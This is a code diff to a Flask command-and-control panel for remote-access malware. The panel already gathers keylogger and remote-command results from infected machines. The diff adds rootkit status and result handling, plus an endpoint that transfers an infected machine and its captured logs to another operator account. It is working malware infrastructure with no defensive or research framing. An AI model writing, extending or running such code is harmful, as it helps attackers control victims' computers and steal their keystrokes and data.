@@ -39,6 +39,8 @@ keylog_results = {}
 keylog_results_lock = threading.Lock()
 exec_results = {}
 exec_results_lock = threading.Lock()
+rootkit_results = {}
+rootkit_results_lock = threading.Lock()
 
 # WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
 ws_clients = {}
@@ -1089,6 +1091,10 @@ def c2_websocket(ws):
                 with exec_results_lock:
                     exec_results[client_id] = msg
                 continue
+            if msg.get('type') in ('rootkit_status', 'rootkit_res'):
+                with rootkit_results_lock:
+                    rootkit_results[client_id] = msg
+                continue
             with get_db() as db:
                 db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
                 db.commit()
@@ -1148,6 +1154,58 @@ def c2_delete_client(client_id):
         db.execute('DELETE FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id']))
         db.commit()
     return jsonify({'success': True})
+
+
+@app.route('/api/c2/clients/<client_id>/transfer', methods=['POST'])
+@login_required
+def c2_transfer_client(client_id):
+    user = request.current_user
+    data = request.json or {}
+    target_username = (data.get('target_username') or '').strip()
+    transfer_logs = data.get('transfer_logs', False)
+
+    if not target_username:
+        return jsonify({'error': 'target_username required'}), 400
+    if target_username == user['username']:
+        return jsonify({'error': 'cannot transfer to yourself'}), 400
+
+    with get_db() as db:
+        # только владелец или admin могут трансфернуть
+        row = db.execute(
+            'SELECT 1 FROM clients WHERE client_id = ? AND user_id = ?',
+            (client_id, user['id'])
+        ).fetchone()
+        if not row and user['role'] != 'admin':
+            return jsonify({'error': 'Forbidden'}), 403
+
+        target = db.execute(
+            'SELECT id FROM users WHERE username = ? AND is_banned = 0',
+            (target_username,)
+        ).fetchone()
+        if not target:
+            return jsonify({'error': f'User "{target_username}" not found or banned'}), 404
+
+        target_id = target['id']
+
+        db.execute(
+            'UPDATE clients SET user_id = ? WHERE client_id = ?',
+            (target_id, client_id)
+        )
+
+        if transfer_logs:
+            client_row = db.execute(
+                'SELECT hostname, username FROM clients WHERE client_id = ?',
+                (client_id,)
+            ).fetchone()
+            if client_row:
+                db.execute(
+                    'UPDATE logs SET user_id = ? WHERE hostname = ? AND username = ?',
+                    (target_id, client_row['hostname'], client_row['username'])
+                )
+
+        db.commit()
+
+    return jsonify({'success': True, 'transferred_to': target_username})
 
 
 @app.route('/api/c2/clients/offline', methods=['DELETE'])
@@ -1348,6 +1406,16 @@ def c2_exec_result(client_id):
         return jsonify({'error': 'Forbidden'}), 403
     with exec_results_lock:
         res = exec_results.pop(client_id, None)
+    return jsonify(res)
+
+
+@app.route('/api/c2/rootkit/result/<client_id>')
+@login_required
+def c2_rootkit_result(client_id):
+    if not owns_client(client_id, request.current_user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
+    with rootkit_results_lock:
+        res = rootkit_results.pop(client_id, None)
     return jsonify(res)
 
 
